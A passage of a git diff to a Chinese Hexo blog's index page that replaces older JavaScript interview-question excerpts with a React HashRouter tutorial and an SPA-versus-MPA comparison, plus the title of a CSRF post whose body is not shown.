@@ -318,7 +318,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/04/week1面试题整理/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/04/React-HASH-ROUTER的基础操作/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小柯">
@@ -337,7 +337,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/09/04/week1面试题整理/" itemprop="url">week1面试题整理</a></h2>
+                <a class="post-title-link" href="/2018/10/04/React-HASH-ROUTER的基础操作/" itemprop="url">[React]-HASH-ROUTER的基础操作</a></h2>
         
 
         <div class="post-meta">
@@ -349,8 +349,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-04T08:52:52+08:00">
-                2018-09-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-04T11:49:08+08:00">
+                2018-10-04
               </time>
             
 
@@ -372,8 +372,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/面试题/" itemprop="url" rel="index">
-                    <span itemprop="name">面试题</span>
+                  <a href="/categories/react/" itemprop="url" rel="index">
+                    <span itemprop="name">react</span>
                   </a>
                 </span>
 
@@ -403,7 +403,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,651
+                  879
                 </span>
               
 
@@ -419,7 +419,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  7
+                  4
                 </span>
               
             </div>
@@ -441,14 +441,24 @@
 
       
         
-          <h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'start'</span>); <span class="comment">//第二步,打印'start'</span></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        resolve(<span class="literal">true</span>); <span class="comment">//执行then中的resolve方法</span></span><br><span class="line">        reject(<span class="literal">false</span>); <span class="comment">//状态凝固了不执行</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">1</span>); <span class="comment">//prmise类是同步的,第三步打印1</span></span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        setTimeout(<span class="string">'var x=2;console.log(2);'</span>); <span class="comment">//放入宏任务中</span></span><br><span class="line">        <span class="built_in">console</span>.log(a); <span class="comment">//a未定义会报错,then中返回的promise实例，执行reject方法</span></span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        setTimeout(<span class="string">'var x=3;console.log(3)'</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(b);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">4</span>);</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">5</span>); <span class="comment">//a报错之后执行，第四步打印5</span></span><br><span class="line">    &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">6</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> timer = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="number">7</span>); <span class="comment">//放入宏任务中</span></span><br><span class="line">    &#125;, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">const</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">//放入宏任务中</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">Date</span>.now() - start &lt;= <span class="number">30</span>) &#123;&#125;</span><br><span class="line">        clearTimeout(timer);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(x);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="number">13</span>)</span><br><span class="line">&#125;, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'end'</span>); <span class="comment">//第一步,打印'end'</span></span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/09/04/week1面试题整理/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <h2 id="react-router-dom实现SPA单页面应用"><a href="#react-router-dom实现SPA单页面应用" class="headerlink" title="react-router-dom实现SPA单页面应用"></a>react-router-dom实现SPA单页面应用</h2><blockquote>
+<p>yarn add react-rouert-dom</p>
+</blockquote>
+<h3 id="使用react路由实现SPA"><a href="#使用react路由实现SPA" class="headerlink" title="使用react路由实现SPA"></a>使用react路由实现SPA</h3><p>1、安装路由：yarn add react-router-dom<br>    3及以前版本称为react-router<br>    4及最新版本称为react-router-dom<br>2、学习react路由：<br>    <a href="http://reacttraining.cn/web/api/" target="_blank" rel="noopener">http://reacttraining.cn/web/api/</a><br>3、BrowserRouter VS HashRouter<br>    它是两种常用的路由实现思想,BrowserRouter是浏览器路由,HashRouter是哈希路由<br>[BrowserRouter]:</p>
+<p>它是基于H5中的history API(pushState,replaceState,popState)来保持UI和URL的同步。真实项目中应用的不多,history API并不是很稳定，一般只有当前项目是基于服务器渲染的,我们才会使用浏览器路由<br><a href="http://www.demo.com/" target="_blank" rel="noopener">http://www.demo.com/</a><br><a href="http://www.demo.com/personal/" target="_blank" rel="noopener">http://www.demo.com/personal/</a><br><a href="http://www.demo.com/personal/login/" target="_blank" rel="noopener">http://www.demo.com/personal/login/</a></p>
+<p>[HashRouter]:<br>真实项目中(前后端分离的项目：客户端渲染,我们经常使用的是哈希路由来完成的,它依据相同的页面地址,不同的哈希值,来规划当前页面中的哪一个组件呈现渲染,它基于原生JS构造了一套类似于history API的机制,每一次路由切换都是基于history stack完成的!)</p>
+<p><a href="http://www.demo.com/#/" target="_blank" rel="noopener">http://www.demo.com/#/</a><br><a href="http://www.demo.com/#/personal" target="_blank" rel="noopener">http://www.demo.com/#/personal</a><br><a href="http://www.demo.com/#/personal/login" target="_blank" rel="noopener">http://www.demo.com/#/personal/login</a></p>
+<p>A页面</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (&lt;section&gt;我是A组件&lt;/section&gt;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>B页面</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (&lt;section&gt;我是B组件&lt;/section&gt;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>C页面</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">    &#125;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (&lt;section&gt;我是C组件&lt;/section&gt;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>index.js入口文件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React,&#123;Fragment&#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDOM <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;HashRouter,Route&#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span></span><br><span class="line"><span class="keyword">import</span> A <span class="keyword">from</span> <span class="string">'./component/A'</span>;</span><br><span class="line"><span class="keyword">import</span> B <span class="keyword">from</span> <span class="string">'./component/B'</span>;</span><br><span class="line"><span class="keyword">import</span> C <span class="keyword">from</span> <span class="string">'./component/C'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*  HashRouter:</span></span><br><span class="line"><span class="comment">*  1、当前项目一旦使用Hash-Router,则默认在页面的地址后面加上'#/',也就是Hash默认值是一个斜杆,我们一般让其显示首页组件信息内容</span></span><br><span class="line"><span class="comment">*  2、Hash-Router只能出现一个子元素</span></span><br><span class="line"><span class="comment">*  3、Hash-Router机制中,我们需要根据哈希地址不同,展示不同的组件内容,此时需要使用Route</span></span><br><span class="line"><span class="comment">*  4、Route</span></span><br><span class="line"><span class="comment">*       path:匹配哈希后面的值(地址),但是默认不是严格匹配,当前页面哈希地址只要包含完整的它(内容时不变的)都能被匹配上</span></span><br><span class="line"><span class="comment">        例如：path="/":和它匹配的地址只要有斜杆(都能和它匹配)</span></span><br><span class="line"><span class="comment">        path="/user":'#user/login'也可以匹配,但是"#/user2"这个无法匹配</span></span><br><span class="line"><span class="comment">        component：一旦哈希值和当前route的path相同了,则渲染component指定的组件    </span></span><br><span class="line"><span class="comment">        exact：让path的匹配严谨和严格一些(只有url哈希值和path设定的值相等才可以匹配到)</span></span><br><span class="line"><span class="comment">        path="/":"#/"匹配,但是"#/user"就不再匹配了</span></span><br><span class="line"><span class="comment">    strict    </span></span><br><span class="line"><span class="comment">    render：当页面的哈希地址 和path匹配，会把render规划的方法执行，在方法中一般做"权限校验"(渲染组件之前验证是否存在权限,不存在做一些特殊处理)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ---------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">默认情况下,会和每一个route都做校验(哪怕之前已经有校验成功的)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">ReactDOM.render(&lt;HashRouter&gt;</span><br><span class="line">    &lt;Fragment&gt;</span><br><span class="line">        &lt;Route exact path='/' component=&#123;A&#125;/&gt;</span><br><span class="line">        &lt;Route path='/user' component=&#123;B&#125;/&gt;</span><br><span class="line">        &lt;Route path="/pay" render=&#123;()=&gt;&#123;</span><br><span class="line">            //=&gt;一般在render中处理的是权限校验</span><br><span class="line">            let flag = localStorage.getItem('flag');</span><br><span class="line">            if(flag&amp;&amp;flag === 'safe' )&#123;</span><br><span class="line">                return &lt;C/&gt;</span><br><span class="line">            &#125;</span><br><span class="line">            return '当前环境不安全,不利于支付';</span><br><span class="line">        &#125;&#125;/&gt;</span><br><span class="line">    &lt;/Fragment&gt;</span><br><span class="line">&lt;/HashRouter&gt;,root)</span><br></pre></td></tr></table></figure>
+
+          
         
       
     </div>
@@ -496,7 +506,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/04/数组去重方法汇总/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/04/SPA和MPA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小柯">
@@ -515,7 +525,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/09/04/数组去重方法汇总/" itemprop="url">数组去重方法汇总</a></h2>
+                <a class="post-title-link" href="/2018/10/04/SPA和MPA/" itemprop="url">SPA和MPA</a></h2>
         
 
         <div class="post-meta">
@@ -527,8 +537,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-04T08:47:33+08:00">
-                2018-09-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-04T10:12:08+08:00">
+                2018-10-04
               </time>
             
 
@@ -550,8 +560,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/数组/" itemprop="url" rel="index">
-                    <span itemprop="name">数组</span>
+                  <a href="/categories/react/" itemprop="url" rel="index">
+                    <span itemprop="name">react</span>
                   </a>
                 </span>
 
@@ -581,7 +591,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  398
+                  1,067
                 </span>
               
 
@@ -597,7 +607,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2
+                  4
                 </span>
               
             </div>
@@ -619,15 +629,94 @@
 
       
         
-          <h2 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h2><blockquote>
-<p>思路：创建一个新数组，遍历原数组，若遍历元素在新数组不存在就添加到数组中，反正则忽略<br></p></blockquote>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/09/04/数组去重方法汇总/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
+          
+            <h2 id="单页面应用和多页面应用"><a href="#单页面应用和多页面应用" class="headerlink" title="单页面应用和多页面应用"></a>单页面应用和多页面应用</h2><ul>
+<li>SPA：single page web application单页面web应用(一个产品只有一个页面,所有内容的展示和业务的处理都是在这个页面完成的)</li>
+</ul>
+<p>都在这一个页面中实现切换,webpack中只需要配置一个入口即可,在移动端单页面应用居多。或者PC端管理系统类也是单页面为主。</p>
+<ul>
+<li>MPA：multi page web application多页面web应用(一个产品包含很多页面,通过页面之前的跳转完成业务逻辑的衔接等)</li>
+</ul>
+<p>一个项目由很多页面组成,使用这个产品,主要就是页面之间的跳转(PC端多页面应用居多);基于框架开发的时候,需要在webpack中配置多入口,每一个入口对应一个页面;</p>
+<h3 id="SPA单页面应该的发展历程"><a href="#SPA单页面应该的发展历程" class="headerlink" title="SPA单页面应该的发展历程"></a>SPA单页面应该的发展历程</h3><p>1、页面是基于服务端渲染的,不管是多页面还是单页面,我们肯定有很多需要公共使用的部分，此时我们把它封装成一个组件,通过相关的技术导入到具体的某一个页面中(例如：include)</p>
+<p>注：如果项目是基于服务器渲染的,后台语言当中可以基于include等技术把很多部分拼凑在一起,实现组件化或者插件化开发,也可以实现单页面应用。</p>
+<p>2、基于IFRAME完成单页面应用开发(前端负责)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">优势：主体页面内容依然是一个个的单独开发的,页面加载的时候,只渲染部分页面内容,想要展示谁,才去加载谁(性能上还是不错的)</span><br><span class="line">弊端：父子页面之间的信息通信(包括一些公共资源的使用)IFRAME都体现的不是特别良好</span><br></pre></td></tr></table></figure>
+<p>3、基于轻量级框架的模块化开发<br>AMD：REQUIRE.JS<br>CMD：SEA.JS<br>基于这些思想把每一部分单独写成一个模块，最后基于GRUONT/DULP/FIS等自动化工具,最后把所有的模块都合并到首页中(包括HTML、CSS、JS都合并到一起),通过控制哪些模块的显示隐藏来实现单页面应用开发</p>
+<p>弊端：由于首页中的内容包含了所有模块的信息,所以第一次加载速度很慢(虽然可以解决，但是相对来说比较的麻烦)</p>
+<p>4、基于Vue/React实现模块化、组件化开发,基于他们提供的路由实现SPA单页面,基于webpack打包等</p>
+<h2 id="SPA和MPA的比较"><a href="#SPA和MPA的比较" class="headerlink" title="SPA和MPA的比较"></a>SPA和MPA的比较</h2><table>
+<thead>
+<tr>
+<th>比较</th>
+<th>多页面应用模式(MPA)</th>
+<th>单页面应用模式(SPA)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>应用组成</td>
+<td>由多个完整页面构成</td>
+<td>由一个外壳页面和多个页面片段构成</td>
+</tr>
+<tr>
+<td>跳转方式</td>
+<td>页面之间的跳转是从一个页面跳转到另一个页面</td>
+<td>页面片段之间的跳转是把一个页面片段删除或隐藏,加载另一个页面片段并显示出来。这是片段之间的模拟跳转,并没有离开壳页面</td>
+</tr>
+<tr>
+<td>刷新方式</td>
+<td>整页刷新</td>
+<td>页面片段局部刷新</td>
+</tr>
+<tr>
+<td>跳转后公共资源是否重新加载</td>
+<td>是</td>
+<td>否</td>
+</tr>
+<tr>
+<td>URL模式</td>
+<td><a href="http://xxx.page1.html" target="_blank" rel="noopener">http://xxx.page1.html</a>   <a href="http://xxx.page2.html" target="_blank" rel="noopener">http://xxx.page2.html</a></td>
+<td><a href="http://xxx.shell.html#page1" target="_blank" rel="noopener">http://xxx.shell.html#page1</a>  <a href="http://xxx.shell.html#page2" target="_blank" rel="noopener">http://xxx.shell.html#page2</a></td>
+</tr>
+<tr>
+<td>用户体验</td>
+<td>页面间切换加载慢,不流畅,用户体验差,特别是在移动设备上</td>
+<td>页面片段间的切换快,永辉体验好,包括在移动设备上</td>
+</tr>
+<tr>
+<td>能否实现转场动画</td>
+<td>无法实现</td>
+<td>容易实现</td>
+</tr>
+<tr>
+<td>页面间传递数据</td>
+<td>依赖URL、cookie或者localstorage实现麻烦</td>
+<td>因为在一个页面内,页面片段间传递数据很容易实现</td>
+</tr>
+<tr>
+<td>搜索引擎优化(SEO)</td>
+<td>可以直接做</td>
+<td>需要单独方案做,邮电麻烦</td>
+</tr>
+<tr>
+<td>特别适用范围</td>
+<td>需要对搜索引擎友好的网站</td>
+<td>对体验要求高的应用,特别是移动应用</td>
+</tr>
+<tr>
+<td>开发难度</td>
+<td>低一些,框架选择容易</td>
+<td>高一些,需要专门的框架来降低这种模式的开发难度</td>
+</tr>
+<tr>
+<td>结论</td>
+<td>单页面应用模式由于有很多好处,已经是文本应用开发的潮流,特别是移动应用开发</td>
+</tr>
+</tbody>
+</table>
+
+          
         
       
     </div>
@@ -675,7 +764,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/03/week2面试题整理/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/17/csrf攻击方式以及防御手段/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小柯">
@@ -694,7 +783,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2018/09/03/week2面试题整理/" itemprop="url">week2面试题</a></h2>
+                <a class="post-title-link" href="/2018/09/17/csrf攻击方式以及防御手段/" itemprop="url">csrf攻击方式以及防御手段</a></h2>
         
 
         <div class="post-meta">
@@ -706,8 +795,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-03T15:11:45+08:00">
-                2018-09-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-17T14:54:15+08:00">
+                2018-09-17
               </time>
             
 
@@ -729,8 +818,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/面试题/" itemprop="url" rel="index">
-                    <span itemprop="name">面试题</span>
+                  <a href="/categories/csrf/" itemprop="url" rel="index">
+                    <span itemprop="name">csrf</span>
                   </a>
                 </span>
 
@@ -760,365 +849,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2,049
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  9
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="题目：请实现方法-parse-，作用如下："><a href="#题目：请实现方法-parse-，作用如下：" class="headerlink" title="题目：请实现方法 parse ，作用如下："></a>题目：请实现方法 parse ，作用如下：</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    b: &#123; <span class="attr">c</span>: <span class="number">4</span> &#125;,</span><br><span class="line">    d: [&#123; <span class="attr">e</span>: <span class="number">5</span> &#125;, &#123; <span class="attr">e</span>: <span class="number">6</span> &#125;]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(parse(object, <span class="string">'b.c'</span>) == <span class="number">4</span>) <span class="comment">//true </span></span><br><span class="line"><span class="built_in">console</span>.log(parse(object, <span class="string">'d[0].e'</span>) == <span class="number">5</span>) <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(parse(object, <span class="string">'d.0.e'</span>) == <span class="number">5</span>) <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(parse(object, <span class="string">'d[1].e'</span>) == <span class="number">6</span>) <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(parse(object, <span class="string">'d.1.e'</span>) == <span class="number">6</span>) <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(parse(object, <span class="string">'f'</span>) == <span class="string">'undefined'</span>) <span class="comment">//true</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params">obj, str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = str.split(<span class="string">""</span>); <span class="comment">//将字符串分割，放进数组中</span></span><br><span class="line">    arr = arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item, index</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">isNaN</span>(item)) &#123;</span><br><span class="line">                <span class="comment">//判断是否是数字</span></span><br><span class="line">                <span class="keyword">if</span> (arr[index - <span class="number">1</span>] != <span class="string">'['</span> &amp;&amp; arr[index + <span class="number">1</span>] != <span class="string">']'</span>) &#123;</span><br><span class="line">                    <span class="comment">//如果前后没有,则返回[item]</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"["</span> + item + <span class="string">"]"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//如果不是上述情况，则直接返回该项</span></span><br><span class="line">                    <span class="keyword">return</span> item;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//如果不是数字的情况下,.后面是数字,则需要去掉前面的.</span></span><br><span class="line">                <span class="keyword">if</span> (item === <span class="string">"."</span> &amp;&amp; !<span class="built_in">isNaN</span>(arr[index + <span class="number">1</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//将数组join方法变成字符串赋值给str</span></span><br><span class="line">    str = arr.join(<span class="string">""</span>);</span><br><span class="line">    <span class="comment">//将结果返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="string">'obj.'</span> + str) || <span class="string">'undefined'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/09/03/week2面试题整理/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/03/Vue中watch和computed的区别/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小柯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/xiaoke.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小柯的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/03/Vue中watch和computed的区别/" itemprop="url">Vue中watch和computed的区别</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-03T15:11:45+08:00">
-                2018-09-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
